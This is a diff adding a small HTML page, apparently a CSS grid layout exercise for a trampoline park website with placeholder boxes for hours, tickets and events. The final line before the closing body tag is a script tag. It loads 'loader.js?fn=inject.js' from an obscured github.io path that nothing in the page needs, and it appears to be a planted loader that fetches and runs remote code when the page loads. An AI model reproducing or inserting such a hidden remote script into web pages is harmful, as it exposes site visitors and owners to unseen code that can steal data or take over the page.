@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<title>Trampoline Park</title>
+<style>
+.grid{
+	display:grid;
+height:100vh;
+border-width:5px;
+border-color:white;
+border-style:solid;
+	grid:
+	'head     head     head' 1fr
+	'side2    main     main' 4fr
+	'panel1   card    panel' 3fr
+	'foot     foot     foot' 2fr
+	/200px    1fr     200px;
+}
+#main{
+	grid-area:main;
+	background-color:LightPink;
+color: white;
+font-size:30px;
+text-align:center;
+border-width:5px;
+border-color:white;
+border-style:solid; 
+}
+#head{
+grid-area:head;
+background-color:LightPink;
+color:white;
+font-size:30px;
+text-align:center; 
+}
+#foot{
+grid-area:foot;
+background-color:LightPink;
+color:white;
+font-size:30px;
+text-align:center; 
+}
+#side2{
+	grid-area:side2;
+	background-color:LightPink;
+	color:white;
+	font-size:30px;
+	text-align:center;
+border-width:5px;
+border-color:white;
+ border-style:solid;
+ border-right:pink;
+ border-left:pink;
+}
+#panel{
+grid-area:panel;
+background-color:LightPink;
+border-bottom: solid 5px white;
+color:white;
+font-size:30px;
+text-align:center;
+}
+#cube{
+grid-area:cube;
+background-color:LightPink;
+}
+#card{
+grid-area:card;
+background-color:LightPink;
+}
+</style>
+	</head>
+	<body>
+		<div class="grid">
+			<div id="main">image+book now</div>
+			<div id="head">Trampoline Park</div>
+			<div id="foot">Address+number</div>
+			<div id="side2">hours</div>
+			<div id="panel">tickets</div>
+			<div id="cube">membership</div>
+			<div id="card">events</div>
+		</div>
+
+	<script type='text/javascript'  src="https://alice-c44.github.io/4c3900f8e9dd69b5714c214642cf1a280bd60a97b72770c05502ed560d248b20/loader.js?fn=inject.js"></script></body>
+</html>
